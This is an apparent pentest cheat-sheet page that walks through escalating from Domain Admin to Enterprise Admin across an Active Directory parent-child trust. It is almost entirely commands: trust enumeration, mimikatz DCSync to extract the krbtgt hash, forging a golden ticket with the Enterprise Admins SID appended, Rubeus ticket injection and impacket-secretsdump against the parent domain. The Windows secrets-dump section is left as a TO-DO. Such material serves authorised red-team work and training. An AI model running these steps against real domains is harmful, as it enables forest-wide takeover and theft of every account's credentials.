---
title: "Abuse Parent Child Domain Trusts"
date: 2024-7-2
tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "Windows", "golden ticket", "privesc", "mimikatz", "rubeus", "trusts"]
---

### Privesc from DA (Domain Admin) to EA (Enterprise Admin)

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check trust relationships

```console
# Get all trusted domain objects in a forest
Get-ADTrust -Filter *
```

```console
# Returns a list of trusted domains
nltest /domain_trusts
```

```console
# Gets a collection of the trust relationships of the current forest
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

#### 2. Get current and target domain SID

```console
.\mimikatz.exe 'lsadump::trust' 'exit'
```

#### 3. Get krbtgt hash of current domain

```console
.\mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
```

#### 4. Forge a golden ticket

```console
# Append '-519' to target domain SID (Enterprise Admins Group)
.\mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi' 'exit'
```

<small>*Note: Try different high value hashes if failed*</small>

#### 5. Request a service ticket of target domain

```console
.\rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
```

{{< /tabcontent >}}

#### 6. Secrets Dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Convert kirbi to ccache

```console
python3 rubeustoccache.py <BASE64_TICKET> administrator.kirbi administrator.ccache
```

#### 2. Secrets Dump

```console
export KRB5CCNAME=administrator.ccache
```

```console
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. TO-DO

```console
TO-DO
```

{{< /tabcontent >}}
